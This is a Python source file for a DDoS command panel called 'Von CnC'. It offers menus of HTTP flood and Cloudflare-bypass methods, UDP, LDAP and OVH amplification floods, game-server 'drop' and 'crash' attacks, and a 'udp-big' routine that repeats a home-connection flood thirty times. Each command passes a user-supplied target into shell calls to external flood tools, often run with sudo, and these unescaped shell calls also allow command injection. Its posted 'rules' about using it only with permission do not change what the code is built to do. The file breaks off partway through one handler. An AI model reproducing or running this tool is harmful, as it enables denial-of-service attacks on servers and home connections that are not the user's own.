import socket
import os
import shutil
import random
import getpass
import time
import sys
import threading

try:
    import requests
except ImportError:
    requests = None

def clear():
    safe_run('cls' if os.name == 'nt' else 'clear')
    
def load_proxies(path='proxies.txt'):
    if not os.path.exists(path):
        return []
    with open(path, 'r', encoding='utf-8', errors='ignore') as fh:
        return [line.strip() for line in fh if line.strip()]

proxys = load_proxies()
bots = len(proxys)


def api_lookup(endpoint, query, title=None, retries=2, timeout=15):
    if requests is None:
        print("\x1b[38;2;255;0;0m[ Missing dependency: pip install requests ]\x1b[0m")
        return
    last_err = None
    for attempt in range(1, retries + 1):
        try:
            resp = requests.get(f'https://api.hackertarget.com/{endpoint}/?q={query}', timeout=timeout)
            resp.raise_for_status()
            body = resp.text.strip()
            if not body:
                print("\x1b[38;2;255;0;0m[ API returned an empty response ]\x1b[0m")
                return
            if title:
                print(f"\x1b[38;2;0;255;255m=== {title} :: {query} ===\x1b[0m")
            for line in body.splitlines():
                print(f"\x1b[38;2;233;233;233m{line}\x1b[0m")
            return
        except requests.exceptions.RequestException as exc:
            last_err = exc
            if attempt < retries:
                time.sleep(0.5 * attempt)
    print(f"\x1b[38;2;255;0;0m[ API Error :( -> {last_err} ]\x1b[0m")


def require_args(parts, count, usage):
    if len(parts) < count:
        print(usage)
        return False
    return True


def safe_run(cmd):
    s = cmd.strip()
    inner = s[5:].lstrip() if s.startswith("sudo ") else s
    toks = inner.split()
    prog = toks[0] if toks else ""
    msg = None
    if prog == "node" and shutil.which("node") is None:
        msg = "node is not installed (Layer7 JS methods need Node.js)"
    elif prog == "perl" and shutil.which("perl") is None:
        msg = "perl is not installed (perl methods need Perl)"
    elif prog == "python3" and shutil.which("python3") is None and shutil.which("python") is None:
        msg = "python3 is not installed"
    elif prog.startswith("./"):
        binf = prog[2:]
        if os.name == "nt":
            msg = f"'{binf}' is a Linux binary and cannot run on Windows"
        elif not os.path.exists(binf):
            msg = f"binary '{binf}' not found in this folder"
    if msg:
        print(f"\x1b[38;2;255;170;0m[ ! ] Method skipped: {msg}\x1b[0m")
        return
    os.system(cmd)


# ============================================
# 🔥 NEW METHOD: udp-big (ضرب home-god 30 مرة)
# ============================================
def udp_big_attack(ip, port, packet_size, time_sec):
    """تنفيذ home-god 30 مرة على نفس الهدف"""
    print(f"\x1b[38;2;255;0;0m[🔥] UDP-BIG: Launching 30x home-god on {ip}:{port}\x1b[0m")
    for i in range(30):
        print(f"\x1b[38;2;255;170;0m[+] Attack wave {i+1}/30\x1b[0m")
        safe_run(f'perl home.pl {ip} {port} {packet_size} {time_sec}')
        time.sleep(0.5)  # تأخير بسيط بين الموجات
    print(f"\x1b[38;2;0;255;0m[✅] UDP-BIG: Completed 30 waves on {ip}:{port}\x1b[0m")


def ascii_vro():
    clear()
    print(f'''
                  (\__.-. |
                  == ===_]+
                          |
 ` - .
       ` - >->
      ....           ....           ....           ....
     ||             ||             ||             ||
 /"""l|\        /"""l|\        /"""l|\        /"""l|\\
/_______\      /_______\      /_______\      /_______\\
|  .-.  |------|  .-.  |------|  .-.  |------|  .-.  |------
 __|L|__| .--. |__|L|__| .--. |__|L|__| .--. |__|L|__| .--.
_\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'_
------------------------------------------------------------
    ''')
    time.sleep(0.6)
    clear()
    print(f'''
                     (\__.-. |
                     == ===_]+
                             |
 ` - .
       ` - .
            >->
      ....           ....           ....           ....
     ||             ||             ||             ||
 /"""l|\        /"""l|\        /"""l|\        /"""l|\\
/_______\      /_______\      /_______\      /_______\\
|  .-.  |------|  .-.  |------|  .-.  |------|  .-.  |------
 __|L|__| .--. |__|L|__| .--. |__|L|__| .--. |__|L|__| .--.
_\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'_
------------------------------------------------------------
    ''')
    time.sleep(0.6)
    clear()
    print(f'''
                         (\__.-. |
                         == ===_]+
                                 |
 ` - .
       ` - .
            - 
              ` >->
      ....           ....           ....           ....
     ||             ||             ||             ||
 /"""l|\        /"""l|\        /"""l|\        /"""l|\\
/_______\      /_______\      /_______\      /_______\\
|  .-.  |------|  .-.  |------|  .-.  |------|  .-.  |------
 __|L|__| .--. |__|L|__| .--. |__|L|__| .--. |__|L|__| .--.
_\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'_
------------------------------------------------------------
    ''')
    time.sleep(0.6)
    clear()
    print(f'''
                              (\__.-. |
                              == ===_]+
                                      |
 ` - .
       ` - .
            - 
              `
                - >->
      ....           ....           ....           ....
     ||             ||             ||             ||
 /"""l|\        /"""l|\        /"""l|\        /"""l|\\
/_______\      /_______\      /_______\      /_______\\
|  .-.  |------|  .-.  |------|  .-.  |------|  .-.  |------
 __|L|__| .--. |__|L|__| .--. |__|L|__| .--. |__|L|__| .--.
_\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'_
------------------------------------------------------------
    ''')
    time.sleep(0.6)
    clear()
    print(f'''
                              (\__.-. |
                              == ===_]+
                                      |
 ` - .
       ` - .
            - 
              `
                - 
      ....       `   ....           ....           ....
     ||          >-> ||             ||             ||
 /"""l|\        /"""l|\        /"""l|\        /"""l|\\
/_______\      /_______\      /_______\      /_______\\
|  .-.  |------|  .-.  |------|  .-.  |------|  .-.  |------
 __|L|__| .--. |__|L|__| .--. |__|L|__| .--. |__|L|__| .--.
_\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'__\  \\\p__`o-o'_
------------------------------------------------------------
    ''')
    time.sleep(0.6)
    clear()
    print(f"""
     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____
    """)
    time.sleep(0.8)
    clear()

def si():
    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233m1337 \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to Von CnC! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mGithub: weird1337 \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mNew Methods \x1b[38;2;0;255;255m+ \x1b[38;2;233;233;233mNew UI!')
    print("")

def tools():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m+---------------+
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mTools     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m+-----------------------------------------------+
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mgeoip               \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverse-dns           \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverseip           \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255maddr-info             \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255msubnet-lookup       \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mhttp-headers          \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255masn-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mtraceroute            \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mdns-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mping                   \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m+-----------------------------------------------+
''')

def rules():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m+---------------+
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mRules     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m+-----------------------------------------------+
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m1. Do not attack without someone's permission \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m2. Do not attack .gov/.gob/.edu/.mil domains  \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m3. Do not spam attacks                        \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m4. Only attack stress testing servers         \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m5. Don't skid the panel                       \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m6. Give a star to the github repository       \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m7. The creator does not do any harm           \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m+-----------------------------------------------+
''')

def ports():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m+---------------+
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mPorts     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m+-----------------------------------------------+
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m21 - \x1b[38;2;0;255;255mSFTP       \x1b[38;2;0;212;14m69   - \x1b[38;2;0;255;255mTFTP      \x1b[38;2;0;212;14m5060  - \x1b[38;2;0;255;255mRIP  \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m22 - \x1b[38;2;0;255;255mSSH        \x1b[38;2;0;212;14m80   - \x1b[38;2;0;255;255mHTTP      \x1b[38;2;0;212;14m30120 - \x1b[38;2;0;255;255mFIVEM\x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m23 - \x1b[38;2;0;255;255mTELNET     \x1b[38;2;0;212;14m443  - \x1b[38;2;0;255;255mHTTPS                  \x1b[38;2;0;212;14m║   
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m25 - \x1b[38;2;0;255;255mSMTP       \x1b[38;2;0;212;14m3074 - \x1b[38;2;0;255;255mXBOX                   \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m53 - \x1b[38;2;0;255;255mDNS        \x1b[38;2;0;212;14m5060 - \x1b[38;2;0;255;255mPLAYSATION             \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m+-----------------------------------------------+
''')

def layer7():
    clear()
    si()
    print(f'''
                              \x1b[38;2;0;212;14m+---------------+
                              \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mLayer 7    \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m+---------------------------------------------+
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mgoat-bypass         \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcloudflare-uam    \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-fuzz           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mnormal-bypass     \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-dstat          \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcf-bypass         \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mautobypass          \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttps-bypass      \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-rand           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m100up-bypass      \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-raw            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-flood        \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-overflow       \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-get          \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m+---------------------------------------------+
''')

def layer4():
    clear()
    si()
    print(f'''
                              \x1b[38;2;0;212;14m+---------------+
                              \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mLayer 4    \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m+---------------------------------------------+
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mudp-god             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mldap-vro          \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhome-god            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movh-fuck          \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mtelnet-god          \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mudp-big           \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhaven-god           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<empty>           \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m+---------------------------------------------+
''')

def amp_games():
    clear()
    si()
    print(f'''
                              \x1b[38;2;0;212;14m+---------------+
                              \x1b[38;2;0;212;14m║\x1b[38;2;0;255;255m AMP's \x1b[38;2;0;212;14m/ \x1b[38;2;0;255;255mGames \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m+---------------------------------------------+
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255movhamp              \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mr6-drop           \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mfivem-drop          \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mvse               \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mfortnite-fly        \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mgame-crash        \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m+---------------------------------------------+
''')


def menu():
    sys.stdout.write(f"\x1b]2;Von Net --> Stars: [{bots}] | Online Users: [1] | Methods: [25] | Bypass: [10] | Amps: [1]\x07")
    clear()
    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233m1337 \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to Von CnC! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mGithub: weird1337 \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mNew Methods \x1b[38;2;0;255;255m+ \x1b[38;2;233;233;233mNew UI!')
    print("")
    print("""
                        \x1b[38;2;0;212;14m.▄▄ ·\x1b[38;2;0;186;45m ▄▄▄▄▄ ▄▄▄·\x1b[38;2;0;150;88m  ▐ ▄ ▄▄\x1b[38;2;0;113;133m▌  ▄▄▄ .\x1b[38;2;0;83;168m ▄· ▄▌
                         \x1b[38;2;0;212;14m▐█ ▀.\x1b[38;2;0;186;45m •██  ▐█ ▀█\x1b[38;2;0;150;88m •█▌▐██\x1b[38;2;0;113;133m•  ▀▄.▀·\x1b[38;2;0;83;168m▐█▪██▌
                         \x1b[38;2;0;212;14m▄▀▀▀█\x1b[38;2;0;186;45m▄ ▐█.▪▄█▀▀█\x1b[38;2;0;150;88m ▐█▐▐▌██\x1b[38;2;0;113;133m▪  ▐▀▀▪▄\x1b[38;2;0;83;168m▐█▌▐█▪
                         \x1b[38;2;0;212;14m▐█▄▪▐\x1b[38;2;0;186;45m█ ▐█▌·▐█ ▪▐\x1b[38;2;0;150;88m▌██▐█▌▐█\x1b[38;2;0;113;133m▌▐▌▐█▄▄▌\x1b[38;2;0;83;168m▐█▀·.
                         \x1b[38;2;0;212;14m ▀▀▀▀\x1b[38;2;0;186;45m  ▀▀▀  ▀  ▀\x1b[38;2;0;150;88m ▀▀ █▪.▀\x1b[38;2;0;113;133m▀▀  ▀▀▀ \x1b[38;2;0;83;168m  ▀ • 
                 \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗
                 \x1b[38;2;0;212;14m║       \x1b[38;2;239;239;239mWelcome to Von Net DDoS Panel      \x1b[38;2;0;49;147m║
                 \x1b[38;2;0;212;14m║ \x1b[38;2;0;49;147m- - -   \x1b[38;2;239;239;239mThe best free panel on github  \x1b[38;2;0;212;14m- - - \x1b[38;2;0;49;147m║
                 \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝
                     \x1b[38;2;0;212;14m╔═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╗
                     \x1b[38;2;0;212;14m║  \x1b[38;2;239;239;239mhttps://github.com/weird1337/Von  \x1b[38;2;0;49;147m
                     \x1b[38;2;0;212;14m╚═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╝
                 \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗
                 \x1b[38;2;0;212;14m║   \x1b[38;2;239;239;239mType [help] to see the Von commands.   \x1b[38;2;0;49;147m║
                 \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝
""")
def main():
    menu()
    try:
        while(True):
            cnc = input('''\x1b[38;2;0;212;14m╔══[1337\x1b[38;2;0;186;45m@V\x1b[38;2;0;150;88mon\x1b[38;2;0;49;147m]
\x1b[38;2;0;212;14m╚\x1b[38;2;0;186;45m═\x1b[38;2;0;150;88m═\x1b[38;2;0;113;133m═\x1b[38;2;0;83;168m═\x1b[38;2;0;49;147m➤ \x1b[38;2;239;239;239m''')
            if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
                layer7()
            elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
                layer4()
            elif cnc in ("amp", "amps", "amp/games", "amps/games", "amp/game", "amps/game", "game", "games", "AMP", "GAMES", "GAME"):
                amp_games()
            elif cnc in ("rule", "rules", "RULE", "RULES"):
                rules()
            elif cnc in ("exit", "quit", "EXIT", "QUIT", "logout", "LOGOUT"):
                print("\x1b[38;2;0;255;255m[ Bye from Von CnC ]\x1b[0m")
                sys.exit(0)
    
            elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
                main()
            elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
                ports()
            elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
                tools()
            
            elif "normal-bypass" in cnc:
                try:
                    url = cnc.split()[1]
                    time = cnc.split()[2]
                    safe_run(f'node httpbypassv2.js {url} {time}')
                except IndexError:
                    print('Usage: normal-bypass <url> <time>')
                    print('Example: normal-bypass http://example.com 20')
    
            elif "cf-bypass" in cnc:
                try:
                    url = cnc.split()[1]
                    time = cnc.split()[2]
                    threads = cnc.split()[3]
                    safe_run(f'node cf.js {url} {time} {threads}')
                except IndexError:
                    print('Usage: cf-bypass <url> <time> <threads>')
                    print('Example: cf-bypass http://example-cloud.com 20 15')
    
            elif "https-bypass" in cnc:
                try:
                    url = cnc.split()[1]
                    time = cnc.split()[2]
                    safe_run(f'node https.js {url} {time} proxies.txt')
                except IndexError:
                    print('Usage: https-bypass <url> <time>')
                    print('Example: https-bypass http://example.org 20')
    
            elif "http-raw" in cnc:
                try:
                    url = cnc.split()[1]
                    time = cnc.split()[2]
                    method = cnc.split()[3]
                    safe_run(f'node HTTP-RAW.js {url} {time} {method}')
                except IndexError:
                    print('Usage: https-raw <url> <time> <GET/POST/HEAD>')
                    print('Example: http-raw http://example.com 20 POST')
    
            elif "cloudflare-uam" in cnc:
                try:
                    url = cnc.split()[1]
                    time = cnc.split()[2]
                    cpt = cnc.split()[3]
                    safe_run(f'node uambypass.js {url} {time} {cpt} proxies.txt ')
                except IndexError:
                    print('Usage: cloudflare-uam <url> <time> <req_per_ip>')
                    print('Example: cloudflare-uam http://example-uam.com 20 250')
    
            elif "http-overflow" in cnc:
                try:
                    ip = cnc.split()[1]
                    time = cnc.split()[2]
                    threads = cnc.split()[3]
                    safe_run(f'./OVERFLOW {ip} {time} {threads}')
                except IndexError:
                    print('Usage: http-overflow <ip> <time> <threads>')
                    print('Example: http-overflow 77.233.1XX.XX 30 15')
    
            elif "http-get" in cnc:
                try:
                    url = cnc.split()[1]
                    idk = cnc.split()[2]
                    idk1 = cnc.split()[3]
                    idk2 = cnc.split()[4]
                    safe_run(f'perl httpget {url} {idk} {idk1} {idk2}')
                except IndexError:
                    print('Usage: http-get <url> <10000> <50> <100>')
                    print('Example: http-get http://example.com 10000 50 100')
    
            elif "http-flood" in cnc:
                try:
                    url = cnc.split()[1]
                    threads = cnc.split()[2]
                    method = cnc.split()[3]
                    time = cnc.split()[4]
                    safe_run(f'./httpflood {url} {threads} {method} {time} header.txt')
                except IndexError:
                    print('Usage: http-flood <url> <threads> <get/post> <time>')
                    print('Example: http-flood http://example.com 15 post 30')
    
            elif "100up-bypass" in cnc:
                try:
                    method = cnc.split()[1]
                    ip = cnc.split()[2]
                    port = cnc.split()[3]
                    time = cnc.split()[4]
                    connections = cnc.split()[5]
                    safe_run(f'./100UP-TCP {method} {ip} {port} {time} {connections}')
                except IndexError:
                    print('Usage: 100up-bypass <GET/POST/HEAD> <ip> <port> <time> <connections')
                    print('Example: 100up-bypass GET 77.233.1XX.XX 80 20 80000')
    
            elif "http-dstat" in cnc:
                try:
                    url = cnc.split()[1]
                    connections = cnc.split()[2]
                    rps = cnc.split()[3]
                    safe_run(f'perl dstat.pl {url} {connections} {rps} 13.87')
                except IndexError:
                    print('Usage: http-dstat <url> <connections> <rps>')
                    print('Example: http-dstat http://example.org 50000 50000')
    
            elif "goat-bypass" in cnc:
                try:
                    url = cnc.split()[1]
                    time = cnc.split()[2]
                    rps = cnc.split()[3]
                    safe_run(f'node method.js {url} {time} request {rps}')
                except IndexError:
                    print('Usage: goat-bypass <url> <time> <requests_per_second>')
                    print('Example: goat-bypass http://example-protected-org 30 450')
    
            elif "geoip" in cnc:
                parts = cnc.split()
                if require_args(parts, 2, 'Usage: geoip <ip>\nExample: geoip 1.1.1.1'):
                    api_lookup('geoip', parts[1], 'GEOIP')
    
            elif "reverseip" in cnc:
                parts = cnc.split()
                if require_args(parts, 2, 'Usage: reverseip <ip>\nExample: reverseip 1.1.1.1'):
                    api_lookup('reverseiplookup', parts[1], 'REVERSE-IP')
    
            elif "subnet-lookup" in cnc:
                parts = cnc.split()
                if require_args(parts, 2, 'Usage: subnet-lookup <cdr/ip + netmask>\nExample: subnet-lookup 192.168.1.0/24'):
                    api_lookup('subnetcalc', parts[1], 'SUBNET')
    
            elif "asn-lookup" in cnc:
                parts = cnc.split()
                if require_args(parts, 2, 'Usage: asn-lookup <ip/asn>\nExample: asn-lookup AS15169'):
                    api_lookup('aslookup', parts[1], 'ASN')
    
            elif "dns-lookup" in cnc:
                parts = cnc.split()
                if require_args(parts, 2, 'Usage: dns-lookup <dns>\nExample: dns-lookup google.com'):
                    api_lookup('dnslookup', parts[1], 'DNS')
    
            elif "reverse-dns" in cnc:
                parts = cnc.split()
                if require_args(parts, 2, 'Usage: reverse-dns <ip/domain>\nExample: reverse-dns 8.8.8.8'):
                    api_lookup('reversedns', parts[1], 'REVERSE-DNS')
    
            elif "addr-info" in cnc:
                parts = cnc.split()
                if require_args(parts, 2, 'Usage: addr-info <host>\nExample: addr-info google.com'):
                    try:
                        infos = socket.getaddrinfo(parts[1], None)
                        print(f"\x1b[38;2;0;255;255m=== addr-info :: {parts[1]} ===\x1b[0m")
                        seen = set()
                        for info in infos:
                            fam = info[0]
                            ip = info[4][0]
                            if ip not in seen:
                                seen.add(ip)
                                label = 'IPv4' if fam == socket.AF_INET else ('IPv6' if fam == socket.AF_INET6 else str(fam))
                                print(f"\x1b[38;2;233;233;233m{label}: {ip}\x1b[0m")
                        if not seen:
                            print("\x1b[38;2;255;0;0m[ No addresses resolved ]\x1b[0m")
                    except socket.gaierror:
                        print("\x1b[38;2;255;0;0m[ addr-info : could not resolve host ]\x1b[0m")
    
            elif "http-headers" in cnc:
                parts = cnc.split()
                if require_args(parts, 2, 'Usage: http-headers <url>\nExample: http-headers https://google.com'):
                    target = parts[1]
                    if not target.startswith(('http://', 'https://')):
                        target = 'http://' + target
                    if requests is None:
                        print("\x1b[38;2;255;0;0m[ Missing dependency: pip install requests ]\x1b[0m")
                    else:
                        try:
                            resp = requests.get(target, timeout=15, allow_redirects=True)
                            print(f"\x1b[38;2;0;255;255m=== http-headers :: {resp.url} (status {resp.status_code}) ===\x1b[0m")
                            for k, v in resp.headers.items():
                                print(f"\x1b[38;2;233;233;233m{k}: {v}\x1b[0m")
                        except requests.exceptions.RequestException as exc:
                            print(f"\x1b[38;2;255;0;0m[ http-headers error: {exc} ]\x1b[0m")
    
            elif "traceroute" in cnc:
                parts = cnc.split()
                if require_args(parts, 2, 'Usage: traceroute <host>\nExample: traceroute google.com'):
                    cmd = 'tracert' if os.name == 'nt' else 'traceroute'
                    safe_run(f'{cmd} {parts[1]}')
    
            elif "ping" in cnc:
                parts = cnc.split()
                if require_args(parts, 2, 'Usage: ping <host>\nExample: ping google.com'):
                    flag = '-n' if os.name == 'nt' else '-c'
                    safe_run(f'ping {flag} 4 {parts[1]}')
    
            elif "http-fuzz" in cnc:
                try:
                    url = cnc.split()[1]
                    time = cnc.split()[2]
                    safe_run(f'node httpfuzz.js {url} proxies.txt {time} POST')
                except IndexError:
                    print(f'Usage: http-fuzz <url> <time>')
                    print("Example: http-fuzz http://sexo.org 30")
    
            elif "autobypass" in cnc:
                try:
                    ip = cnc.split()[1]
                    port = cnc.split()[2]
                    time = cnc.split()[3]
                    safe_run(f'./AUTOBYPASS TCP {ip} {port} {time}')
                except IndexError:
                    print('Usage: autobypass <ip> <port> <time>')
                    print('Example: autobypass 188.40.1XX.XX 80 30')
    
            elif "http-rand" in cnc:
                try:
                    url = cnc.split()[1]
                    time = cnc.split()[2]
                    safe_run(f'node HTTP-RAND.js {url} {time}')
                except IndexError:
                    print("Usage: http-rand <url> <time>")
                    print("Example: http-rand http://si.com 10")
    
            elif 'ldap-vro' in cnc:
                try:
                    ip = cnc.split()[1]
                    port = cnc.split()[2]
                    threads = cnc.split()[3]
                    pps = cnc.split()[4]
                    time = cnc.split()[5]
                    safe_run(f'sudo ./ldapv2 {ip} {port} ldaplist.txt {threads} {pps} {time}')
                except IndexError:
                    print(f'Usage: ldap-vro <ip> <port> <threads> <pps> <time>')
                    print(f'Example: ldap-vro 1.1.1.1 8739 15 1024 50')
    
            elif "ovhamp" in cnc:
                try:
                    ip = cnc.split()[1]
                    port = cnc.split()[2]
                    safe_run(f'sudo ./OVH-AMP {ip} {port}')
                except IndexError:
                    print(f'Usage: ovhamp <ip> <port>')
                    print(f'Example: ovhamp 1.1.1.1 34264')
    
            elif "fivem-drop" in cnc:
                try:
                    ip = cnc.split()[1]
                    port = cnc.split()[2]
                    threads = cnc.split()[3]
                    pps = cnc.split()[4]
                    time = cnc.split()[5]
                    safe_run(f'sudo ./fivem {ip} {port} fivem.txt {threads} {pps} {time}')
                except IndexError:
                    print('Usage: fivem-drop <ip> <port> <threads> <pps> <time>')
                    print('Example: fivem-drop 1.1.1.1 30120 15 80000 30')
    
            elif "fortnite-fly" in cnc:
                try:
                    ip = cnc.split()[1]
                    port = cnc.split()[2]
                    threads = cnc.split()[3]
                    time = cnc.split()[4]
                    pps = cnc.split()[5]
                    safe_run(f'python3 FORTNITE-FLY.py {ip} {port} {threads} {time} {pps}')
                except IndexError:
                    print('Usage: fornite-fly <ip> <port> <threads> <time> <pps>')
                    print(f'Example: fortnite-fly 1.1.1.1 45 30 50 100000')
    
            elif "udp-god" in cnc:
                try:
                    ip = cnc.split()[1]
                    port = cnc.split()[2]
                    threads = cnc.split()[3]
                    throttle = cnc.split()[4]
                    time = cnc.split()[5]
                    safe_run(f'sudo ./udp {ip} {port} {threads} {throttle} {time}')
                except IndexError:
                    print(f'Usage: udp-god <ip> <port> <threads> <throttle> <time>')
                    print(f'Example: udp-god 1.1.1.1 80 30 40000 30')
    
            elif "haven-god" in cnc:
                try:
                    ip = cnc.split()[1]
                    time = cnc.split()[2]
                    safe_run(f'sudo ./haven -d {ip} -t {time} -z 130')
                except IndexError:
                    print('Usage: haven-god <ip> <time>')
                    print('Example: haven-god 192.168.0.1 30')
    
            elif "telnet-god" in cnc:
                try:
                    ip = cnc.split()[1]
                    threads = cnc.split()[2]
                    pps = cnc.split()[3]
                    time = cnc.split()[4]
                    safe_run(f'sudo ./telnet {ip} {threads} {pps} {time}')
                except IndexError:
                    print(f'Usage: telnet-god <ip> <threads> <pps> <time>')
                    print('Example: telnet-god 192.168.0.1 30 80000 50')
    
            # ============================================
            # 🔥 MODIFIED: home-god (30x attack)
            # ============================================
            elif "home-god" in cnc:
                try:
                    ip = cnc.split()[1]
                    port = cnc.split()[2]
                    packet_size = cnc.split()[3]
                    time_sec = cnc.split()[4]
